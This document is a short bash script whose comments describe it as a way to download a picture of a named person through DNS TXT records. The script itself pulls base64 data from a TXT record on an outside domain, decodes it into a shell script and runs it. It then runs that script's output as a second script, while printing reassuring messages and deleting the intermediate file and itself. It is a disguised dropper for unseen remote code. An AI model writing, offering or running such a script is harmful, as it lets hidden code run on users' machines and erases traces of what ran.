#!/bin/bash
#
#####################################################################################
# Would you like to download a picture of Marcus Holtz? NOW YOU CAN!
# Using DNS txt records in Base64 you can download a picture.
#####################################################################################
# Run this script with:
# chmod +x downloadmarcusholtz.sh; /bin/bash downloadmarcusholtz.sh
#####################################################################################
dig +short TXT marcusInDNS.holtzweb.com @9.9.9.9 | tr -d '"' | tr -d "\n\r" | tr -d [:blank:] | base64 -d > showmethescript.sh; sh showmethescript.sh > showmemarcus.sh; rm showmethescript.sh; echo -e "\nEverything ran perfect."; sleep 1; echo -e "Now you have to wait for the executable\n"; sleep 2; chmod +x showmemarcus.sh; sleep 1; rm downloadmarcusholtz.sh; echo ""; /bin/bash showmemarcus.sh;
